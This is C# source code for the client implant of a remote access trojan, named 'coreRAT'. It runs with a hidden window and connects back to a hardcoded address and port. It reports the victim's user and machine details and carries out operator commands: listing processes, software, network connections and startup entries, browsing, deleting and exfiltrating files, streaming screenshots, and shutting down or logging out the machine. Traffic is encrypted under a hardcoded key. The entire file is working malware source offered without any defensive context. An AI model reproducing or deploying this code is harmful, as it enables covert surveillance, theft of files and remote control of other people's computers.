using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System;
using System.Diagnostics;
using testCoreRATc;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Drawing;
using System.Drawing.Imaging;

namespace coreRAT_server
{
    public class EntryPoint
    {
        public static void Main(string[] args)
        {
            
            MainForm mainForm = new MainForm();
            mainForm.Size = new System.Drawing.Size(0, 0);
            mainForm.ShowInTaskbar = false;
            mainForm.Visible = false;
            mainForm.Opacity = 0;
            Application.Run(mainForm);

        }
    }

    public class MainForm : Form
    {

        private TcpClient client;
        private Thread connectionThread;
        private Thread screensending;
        private readonly string encryptionKey = "xilAeTlwiiVXyBD0qxHJHpW8d8tbPqTw";
        private readonly int delay = 100;
        private readonly int clientPort = 4440;
        private readonly string clientIP = "127.0.0.1";
        private NetworkStream stream;

        public MainForm()
        {
            this.Load += MainForm_Load;
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            try
            {
                Debug.WriteLine("Form Load...");
                connectionThread = new Thread(Connect);
                connectionThread.Start();
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Exception in MainForm_Load: " + ex.Message);
            }
        }

        #region Connection

        private void Connect()
        {
            while (true)
            {
                try
                {
                    if (client == null || !client.Connected)
                    {
                        if (delay > 0)
                        {
                            Thread.Sleep(delay);
                        }

                        client = new TcpClient(clientIP, clientPort);
                        stream = client.GetStream();

                        string newConnectionMessage = string.Format("NewConnection|C#|{0}|{1}|{2}|{3}|{4}",
                                                                  SystemInformation.UserName, SystemInformation.ComputerName,
                                                                  Environment.OSVersion.Platform, Environment.OSVersion.Version.ToString(), GetPrivileges());

                        string encryptedMessage = AESEncrypt(newConnectionMessage, encryptionKey);
                        Send(encryptedMessage);

                        byte[] buffer = new byte[1024];
                        client.GetStream().BeginRead(buffer, 0, 0, new AsyncCallback(Read), null);
                        break; // Exit loop on successful connection
                    }
                }
                catch (Exception ex)
                {
                    if (client != null)
                    {
                        client.Close();
                        client = null;
                    }
                    Thread.Sleep(4000); // Retry after delay
                }
            }
        }

        private void Read(IAsyncResult ar)
        {
            string message = "";
            try
            {
                StreamReader reader = new StreamReader(client.GetStream());
                message = reader.ReadLine();
                message = AESDecrypt(message, encryptionKey);
                Parse(message);
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, Read, null);
            }
            catch (Exception)
            {
                System.Threading.Thread.Sleep(4000);
                Connect();
            }
        }
        public void Send(string message)
        {
            try
            {
                StreamWriter writer = new StreamWriter(client.GetStream());
                writer.WriteLine(message);
                writer.Flush();
            }
            catch
            {
            }
        }


        private void Parse(string msg)
        {
            Debug.WriteLine("Recieving message : "+ msg);
            try
            {
                if (msg.StartsWith("NewConnection"))
                {
                    // Handle NewConnection case
                }
                else if (msg.StartsWith("GetProcess"))
                {
                    SendProcess();
                }
                else if (msg.StartsWith("Software"))
                {
                    GetInstalledSoftware();
                }
                else if(msg.StartsWith("GetTCPConnections"))
                {
                    Send(AESEncrypt("TCPConnections" + GetTCPConnections(), encryptionKey));
                }
                else if(msg.StartsWith("GetStartup"))
                {
                    GetStartupEntries();
                }
                else if (msg.StartsWith("GetThumbNails"))
                {
                    SendThumbNail(); 
                }
                else if (msg.StartsWith("RD"))
                {
                    string[] parts = msg.Split('|');

                    long comp = long.Parse(parts[1]);
                    string res = parts[2];
                    screensending = new Thread(() => SendScreenInternal(res, comp));
                    screensending.Start();
                }
                else if (msg.StartsWith("Stop"))
                {
                    screensending.Abort();
                }
                else if (msg.StartsWith("Disconnected"))
                {
                    RestartConnection();
                }
                else if (msg.StartsWith("Restart"))
                {
                    RestartApplication();
                }
                else if (msg.StartsWith("Close"))
                {
                    Application.Exit();
                }
                else if (msg.StartsWith("ListDrives"))
                {
                    ListDrives();
                }
                else if (msg.StartsWith("ListFiles"))
                {
                    showfiles(msg.Replace("ListFiles", ""));
                }
                else if (msg.StartsWith("mkdir"))
                {
                    CreateDirectory(msg.Replace("mkdir", ""));
                }
                else if (msg.StartsWith("rmdir"))
                {
                    DeleteDirectory(msg.Replace("rmdir", ""));
                }
                else if (msg.StartsWith("rnfolder"))
                {
                    RenameDirectory(msg.Replace("rnfolder", ""));
                }
                else if (msg.StartsWith("mvdir"))
                {
                    MoveDirectory(msg.Replace("mvdir", ""));
                }
                else if (msg.StartsWith("mkfile"))
                {
                    CreateNewFile(msg);
                }
                else if (msg.StartsWith("rmfile"))
                {
                    DeleteFile(msg.Replace("rmfile", ""));
                }
                else if (msg.StartsWith("exfile"))
                {
                    ExecuteFile(msg.Replace("exfile", ""));
                }
                else if (msg.StartsWith("exdir"))
                {
                    ExecuteDirectory(msg.Replace("exdir", ""));
                }
                else if (msg.StartsWith("rnfile"))
                {
                    RenameFile(msg.Replace("rnfile", ""));
                }
                else if (msg.StartsWith("movefile"))
                {
                    MoveFile(msg.Replace("movefile", ""));
                }
                else if (msg.StartsWith("sharefile"))
                {
                    ShareFile(msg.Replace("sharefile", ""));
                }
                else if (msg.StartsWith("FileUpload"))
                {
                    UploadFile(msg.Replace("FileUpload", ""));
                }
                else if (msg.Contains("logout"))
                {
                    Process.Start("shutdown", "/l");
                }
                else if (msg.Contains("shutdwn"))
                {
                    Process.Start("shutdown", "/s");
                }
                else if (msg.Contains("restrt"))
                {
                    Process.Start("shutdown", "/r");
                }
            }
            catch
            {
                // Log the exception
            }
        }

        private void RestartConnection()
        {
            connectionThread = new Thread(new System.Threading.ThreadStart(Connect));
            connectionThread.Start();
        }

        private void RestartApplication()
        {
            // Implement restart logic
        }

        #endregion

        #region Get Connect
        private string GetPrivileges()
        {
            return "User";
        }
        #endregion

        #region Encryption
        private const string ALGORITHM = "AES";
        private const string TRANSFORMATION = "AES/ECB/PKCS5Padding";

        public static string AESEncrypt(string input, string key)
        {
            byte[] secretKey = GetKey(key);
            using (RijndaelManaged aes = new RijndaelManaged())
            {
                aes.Key = secretKey;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform encryptor = aes.CreateEncryptor())
                {
                    byte[] inputBytes = Encoding.UTF8.GetBytes(input);
                    byte[] encryptedBytes = encryptor.TransformFinalBlock(inputBytes, 0, inputBytes.Length);
                    return Convert.ToBase64String(encryptedBytes);
                }
            }
        }

        public static string AESDecrypt(string input, string key)
        {
            byte[] secretKey = GetKey(key);
            using (RijndaelManaged aes = new RijndaelManaged())
            {
                aes.Key = secretKey;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    byte[] inputBytes = Convert.FromBase64String(input);
                    byte[] decryptedBytes = decryptor.TransformFinalBlock(inputBytes, 0, inputBytes.Length);
                    return Encoding.UTF8.GetString(decryptedBytes);
                }
            }
        }

        private static byte[] GetKey(string key)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] keyBytes = Encoding.UTF8.GetBytes(key);
                return sha.ComputeHash(keyBytes);
            }
        }
        #endregion

        #region FileManager
        private void ListDrives()
        {
            try
            {
                string drives = string.Empty;
                foreach (DriveInfo drive in DriveInfo.GetDrives())
                {
                    string ltr = System.Convert.ToString(drive.Name);
                    if (drive.IsReady && drive.VolumeLabel != "")
                    {
                    }
                    else
                    {
                    }
                    drives += ltr + "|";
                }
                Send(AESEncrypt("Drives" + drives, encryptionKey));
            }
            catch
            {
            }
        }

        public void showfiles(string path)
        {
            ListView listviewfiles = new ListView();

            try
            {
                listviewfiles.Items.Clear();

                // Get all directories
                foreach (string dir in Directory.GetDirectories(path))
                {
                    string relativePath = dir.Replace(path, "");
                    DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(path, relativePath));

                    ListViewItem item = new ListViewItem(relativePath, 0);
                    item.SubItems.Add(directoryInfo.CreationTime.ToString());
                    item.SubItems.Add(directoryInfo.LastAccessTime.ToString());
                    item.SubItems.Add("");
                    item.SubItems.Add("1"); // Assuming directory type indicator

                    listviewfiles.Items.Add(item);
                }

                // Get all files
                foreach (string file in Directory.GetFiles(path))
                {
                    FileInfo fileInfo = new FileInfo(file);

                    ListViewItem item = new ListViewItem(fileInfo.Name);
                    item.SubItems.Add(fileInfo.CreationTime.ToString());
                    item.SubItems.Add(fileInfo.LastAccessTime.ToString());
                    item.SubItems.Add(FormatFileSize(fileInfo.Length));
                    item.SubItems.Add("0"); // Assuming file type indicator

                    listviewfiles.Items.Add(item);
                }

                // Build the data string
                string items = path + "|";
                foreach (ListViewItem item in listviewfiles.Items)
                {
                    items += item.Text + "|" + item.SubItems[1].Text + "|" + item.SubItems[2].Text + "|"
                             + item.SubItems[3].Text + "|" + item.SubItems[4].Text + "\n";
                }
                items = items.Trim();

                // Send encrypted data (assuming your AESEncrypt function exists)
                Send(AESEncrypt("FileManagerFiles" + items, encryptionKey));
            }
            catch (Exception ex)
            {
                // Handle exception appropriately (e.g., log error)
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        private string FormatFileSize(long bytes)
        {
            double sizeInMB = (double)bytes / (1024 * 1024);
            return string.Format("{0:###,###,##0.00} MB", sizeInMB);
        }


        private void CreateDirectory(string path)
        {
            try
            {
                Directory.CreateDirectory(path);
            }
            catch
            {
                // Log the exception
            }
        }

        private void DeleteDirectory(string path)
        {
            try
            {
                Directory.Delete(path, true);
            }
            catch
            {
                // Log the exception
            }
        }

        private void RenameDirectory(string path)
        {
            try
            {
                string[] parts = path.Split('|');

                string oldPath = parts[0];
                string newPath = parts[1];
                Directory.Move(oldPath, newPath);
            }
            catch
            {
                // Log the exception
            }
        }

        private void MoveDirectory(string path)
        {
            try
            {
                string[] parts = path.Split('|');
                string sourcePath = parts[0];
                string destinationPath = parts[1];
                Directory.Move(sourcePath, destinationPath);
            }
            catch
            {
                // Log the exception
            }
        }

        private void CreateNewFile(string txt)
        {
            try
            {
                string contentWithoutMkfile = txt.Replace("mkfile", "");
                string[] parts = contentWithoutMkfile.Split('|');
                string targetPath = parts[0];
                string content = parts[1];

                File.WriteAllText(targetPath, content);
            }
            catch
            {
                // Log the exception
            }
        }

        private void DeleteFile(string path)
        {
            try
            {
                using (FileStream fs = File.Open(path, FileMode.Open))
                {
                    fs.SetLength(0); // Set file size to zero, effectively erasing content
                }
                File.Delete(path);
            }
            catch
            {
                // Log the exception
            }
        }

        private void ExecuteFile(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    Process.Start("explorer.exe", path);
                }
            }
            catch
            {
                // Log the exception
            }
        }

        private void ExecuteDirectory(string path)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    Process.Start("explorer.exe", path);
                }
            }
            catch
            {
                // Log the exception
            }
        }

        private void RenameFile(string path)
        {
            try
            {
                string[] parts = path.Split('|');
                string oldPath = parts[0];
                string newPath = parts[1];
                File.Move(oldPath, newPath);
            }
            catch
            {
                // Log the exception
            }
        }

        private void MoveFile(string path)
        {
            try
            {
                string[] parts = path.Split('|');
                string sourcePath = parts[0];
                string destinationPath = parts[1];
                File.Move(sourcePath, destinationPath);
            }
            catch
            {
                // Log the exception
            }
        }

        private void ShareFile(string filepath)
        {
            try
            {
                // Read file bytes
                byte[] fileBytes = File.ReadAllBytes(filepath);

                // Convert bytes to base64 string
                string base64String = Convert.ToBase64String(fileBytes);

                // Prepare data to encrypt
                string dataToEncrypt = string.Format("IncomingFile{0}", base64String);

                // Encrypt data (assuming your AESEncrypt function exists)
                string encryptedData = AESEncrypt(dataToEncrypt, encryptionKey);

                // Send encrypted data
                Send(encryptedData);
            }
            catch
            {
                // Log the exception
            }
        }

        private void UploadFile(string msg)
        {
            // Implement file upload logic
        }
        #endregion

        #region process list
        public void SendProcess()
        {
            ListView listView1 = new ListView();
            int count = 0;

            foreach (var process in Process.GetProcesses(Environment.MachineName))
            {
                try
                {
                    ListViewItem item = new ListViewItem(process.ProcessName + ".exe");
                    item.SubItems.Add(Math.Round(process.PrivateMemorySize64 / 1024.0).ToString("N0") + " K");
                    item.SubItems.Add(process.Responding.ToString());
                    item.SubItems.Add(process.StartTime.ToString().Trim());
                    item.SubItems.Add(process.Id.ToString());
                    listView1.Items.Add(item);
                    count++;
                }
                catch
                {
                    // Handle or log exception as needed
                }
            }

            StringBuilder items = new StringBuilder();
            foreach (ListViewItem item in listView1.Items)
            {
                items.Append(item.Text)
                     .Append("|")
                     .Append(item.SubItems[1].Text)
                     .Append("|")
                     .Append(item.SubItems[2].Text)
                     .Append("|")
                     .Append(item.SubItems[3].Text)
                     .Append("|")
                     .Append(item.SubItems[4].Text)
                     .Append(Environment.NewLine);
            }

            string itemsStr = items.ToString().Trim();

            Send(AESEncrypt("GetProcess" + itemsStr, encryptionKey));
        }

            public void GetInstalledSoftware()
            {
                try
                {
                    string regpath = @"Software\Microsoft\Windows\CurrentVersion\Uninstall";
                    string software = string.Empty;
                    int softwareCount = 0;

                    using (RegistryKey regkey = Registry.LocalMachine.OpenSubKey(regpath))
                    {
                        if (regkey == null) return;

                        foreach (string subkeyName in regkey.GetSubKeyNames())
                        {
                            using (RegistryKey subkey = regkey.OpenSubKey(subkeyName))
                            {
                                string value = subkey.GetValue("DisplayName", "").ToString();
                                if (!string.IsNullOrEmpty(value))
                                {
                                    bool includes = true;
                                    if (value.Contains("Hotfix")) includes = false;
                                    if (value.Contains("Security Update")) includes = false;
                                    if (value.Contains("Update for")) includes = false;

                                    if (includes)
                                    {
                                        software += value + "|" + Environment.NewLine;
                                        softwareCount++;
                                    }
                                }
                            }
                        }
                    }

                    string final = "Software|" + softwareCount + "|" + software;
                    Send(AESEncrypt(final, encryptionKey));
                }
                catch 
                {

                }
            }
            public string GetTCPConnections()
            {
                try
                {
                    StringBuilder s = new StringBuilder();

                    IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
                    TcpConnectionInformation[] connections = properties.GetActiveTcpConnections();

                    foreach (TcpConnectionInformation c in connections)
                    {
                        s.AppendFormat("{0}|{1}|{2}", c.LocalEndPoint, c.RemoteEndPoint, c.State)
                         .Append(Environment.NewLine);
                    }

                    return s.ToString().Trim();
                }
                catch (Exception ex)
                {
                    // Handle or log exception as needed
                    Console.WriteLine(ex.Message);
                    return null;
                }
            }
            public void GetStartupEntries()
            {
                try
                {
                    string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                    DirectoryInfo dir = new DirectoryInfo(startupFolderPath);
                    FileInfo[] files = dir.GetFiles();

                    RegistryKey[] regkeys = new RegistryKey[4];

                    regkeys[0] = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                    regkeys[1] = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
                    regkeys[2] = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                    regkeys[3] = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");

                    StringBuilder result = new StringBuilder();

                    foreach (FileInfo file in files)
                    {
                        result.AppendFormat("{0}|{1}|{2}", startupFolderPath, file.Name, Path.Combine(startupFolderPath, file.Name))
                              .Append(Environment.NewLine);
                    }

                    foreach (var regkey in regkeys)
                    {
                        if (regkey != null)
                        {
                            foreach (string valueName in regkey.GetValueNames())
                            {
                                result.AppendFormat("{0}|{1}|{2}", regkey.Name, valueName, regkey.GetValue(valueName))
                                      .Append(Environment.NewLine);
                            }
                        }
                    }

                    string finalResult = result.ToString().Trim();
                    Send(AESEncrypt("Strtp" + finalResult, encryptionKey));
                }
                catch (Exception ex)
                {
                    // Handle or log exception as needed
                    Console.WriteLine(ex.Message);
                }
            }
        #endregion

        #region screen
            public void SendThumbNail()
            {
                try
                {
                    // Capture the screen
                    Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                    using (Graphics g = Graphics.FromImage(bmpScreenshot))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, bmpScreenshot.Size);
                    }

                    // Create thumbnail
                    Image imgThumbnail = bmpScreenshot.GetThumbnailImage(242, 152, null, IntPtr.Zero);

                    // Save the thumbnail as JPEG with high quality
                    Bitmap bmpThumbnail = new Bitmap(imgThumbnail);
                    ImageCodecInfo jgpEncoder = GetEncoder(ImageFormat.Jpeg);
                    System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                    EncoderParameters myEncoderParameters = new EncoderParameters(1);
                    EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 100L);
                    myEncoderParameters.Param[0] = myEncoderParameter;

                    string tempFilePath = Path.Combine(Path.GetTempPath(), "thumb.jpg");
                    bmpThumbnail.Save(tempFilePath, jgpEncoder, myEncoderParameters);

                    // Read the saved file, encrypt it, and send it
                    string base64Thumbnail = Convert.ToBase64String(File.ReadAllBytes(tempFilePath));
                    Send(AESEncrypt("ThumbNail" + base64Thumbnail, encryptionKey));

                    // Delete the temporary file
                    File.Delete(tempFilePath);
                }
                catch 
                {
                }
            }

            private ImageCodecInfo GetEncoder(ImageFormat format)
            {
                ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                foreach (ImageCodecInfo codec in codecs)
                {
                    if (codec.FormatID == format.Guid)
                    {
                        return codec;
                    }
                }
                return null;
            }
            private void SendScreenInternal(string res, long comp)
            {
                try
                {
                    string[] resolution = res.Split('x');
                    int width = int.Parse(resolution[0]);
                    int height = int.Parse(resolution[1]);

                    // Capture the screen
                    Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                    using (Graphics g = Graphics.FromImage(bmpScreenshot))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, bmpScreenshot.Size);
                    }

                    // Create thumbnail
                    Image imgThumbnail = bmpScreenshot.GetThumbnailImage(width, height, null, IntPtr.Zero);

                    // Save the thumbnail as JPEG with specified quality
                    Bitmap bmpThumbnail = new Bitmap(imgThumbnail);
                    ImageCodecInfo jgpEncoder = GetEncoder(ImageFormat.Jpeg);
                    System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                    EncoderParameters myEncoderParameters = new EncoderParameters(1);
                    EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, comp);
                    myEncoderParameters.Param[0] = myEncoderParameter;

                    string tempFilePath = Path.Combine(Path.GetTempPath(), "scr.jpg");
                    bmpThumbnail.Save(tempFilePath, jgpEncoder, myEncoderParameters);

                    // Read the saved file, encrypt it, and send it
                    string base64Screenshot = Convert.ToBase64String(File.ReadAllBytes(tempFilePath));
                    Send(AESEncrypt("RemoteDesktop" + base64Screenshot, encryptionKey));

                    // Delete the temporary file
                    File.Delete(tempFilePath);
                }
                catch 
                {
                }
            }

        #endregion
    }
}